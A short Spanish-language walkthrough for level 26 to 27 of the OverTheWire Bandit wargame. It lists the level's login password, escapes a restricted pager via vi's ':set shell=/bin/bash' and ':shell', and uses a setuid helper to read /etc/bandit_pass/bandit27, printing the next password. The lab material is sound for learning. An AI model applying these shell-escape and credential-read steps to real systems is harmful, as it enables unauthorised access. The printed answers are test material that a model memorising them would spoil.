# Level 27

## Objetivos
Good job getting a shell! Now hurry and grab the password for bandit27!

## Datos de acceso 
bandit26 <-UserName
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1 <-Password
## Solución 
```bash
en modo edicion vi
:set shell=/bin/bash
:shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$  ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$
```

## Notas dicionales 
En modo edicion: ponemos la ventana de lo largo lo más angosta posible y que nos permita ver, 
nos logeamos, de esta forma no se cerrará. enseguida tecleamos "V" después ":" (dos puntos) ahí  entramos en modo edicion escribimos el comando ": set shell=/bin/bash" enter y volvemos escribimos "shell". ahora si, estamos dentro de bandit 26. y solo resta efectuar los comandos "./bandit27-do cat /etc/bandit_pass/bandit27"